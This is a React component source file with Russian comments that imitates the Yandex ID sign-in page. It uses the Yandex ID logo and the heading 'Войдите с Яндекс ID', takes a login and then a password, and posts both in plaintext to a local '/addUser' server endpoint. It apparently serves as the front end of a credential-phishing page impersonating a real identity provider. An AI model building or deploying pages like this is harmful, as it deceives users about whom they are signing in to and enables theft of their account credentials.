import { useState } from "react";
import ButtonComponent from "./components/ButtonComponent";
import ToggleButton from "./components/ToggleButton";
import { FaArrowLeft } from "react-icons/fa";
import YaIdLogo from "./assets/YaIdLogo.png";
// Импортируй другие картинки, если нужно, например:
import rusFlagImg from "./assets/rusFlagImg.png";

const App = () => {
  // Шаг формы: "login" или "password"
  const [step, setStep] = useState("login");
  // Состояния для логина и пароля
  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  // Состояние для текущего значения в инпуте
  const [inputValue, setInputValue] = useState("");
  // Флаг ошибки
  const [error, setError] = useState(false);

  // Обработчик submit формы
  const handleSubmit = (e) => {
    e.preventDefault();

    // Если поле пустое, показать ошибку
    if (!inputValue.trim()) {
      setError(true);
      return;
    }
    setError(false);

    // Если сейчас шаг "login"
    if (step === "login") {
      // Сохраняем введённый логин
      setLogin(inputValue);
      // Очищаем инпут для следующего шага
      setInputValue("");
      // Переходим к шагу "password"
      setStep("password");
    }
    // Если шаг "password"
    else if (step === "password") {
      // Сохраняем пароль
      setPassword(inputValue);

      // Собираем объект с данными для отправки
      const userData = {
        login,          // ранее введённый логин
        password: inputValue, // введённый пароль
      };

      // Отправляем данные на сервер
      fetch("http://localhost:7000/addUser", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(userData),
      })
        .then(async (response) => {
          const data = await response.json();
          if (response.ok) {
            console.log("Пользователь добавлен:", data);
            // Можно сбросить состояние или показать сообщение
            setInputValue("");
            // Например, сбросить шаг или перекинуть пользователя на другую страницу
          } else {
            console.error("Ошибка:", data.error);
            setError(true);
          }
        })
        .catch((error) => {
          console.error("Ошибка при отправке запроса:", error);
          setError(true);
        });
    }
  };

  return (
    <div className="flex flex-col items-center justify-center gap-2 min-h-screen bg-[#121212] text-white">
      <div className="bg-[#1c1c1c] rounded-3xl p-[32px] max-w-[412px] text-center">
        <div className="flex items-center justify-between mb-4">
          <button className="text-xl">
            <FaArrowLeft />
          </button>
          <img className="max-w-40 invert" src={YaIdLogo} alt="YaIdLogo" />
        </div>

        <h2 className="text-lg font-semibold mb-4">Войдите с Яндекс ID</h2>
        <ToggleButton toggle={() => {}} />

        {/* Форма с инпутом и кнопкой */}
        <form onSubmit={handleSubmit} className="w-full">
          <div className="relative w-full mt-5 mb-4">
            {/* Можно добавить дополнительные элементы, например, кнопку с флагом для номера,
                если isNumber используется – здесь в примере не меняем разметку */}
            <input
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              onFocus={() => setError(false)}
              type={step === "login" ? "text" : "password"}
              placeholder={
                error
                  ? "Введите данные!"
                  : step === "login"
                  ? "Логин или email"
                  : "Пароль"
              }
              className={`w-full p-3 rounded-2xl border min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-gray-500 text-2xl ${
                error ? "border-red-500 text-red-400 placeholder-red-400" : "border-[#d3d3de33]"
              }`}
            />
          </div>

          <ButtonComponent
            type="submit"
            name={step === "login" ? "Далее" : "Войти"}
            backGround="bg-white"
            textColor="text-[#1f1f24]"
          />
        </form>
      </div>
    </div>
  );
};

export default App;
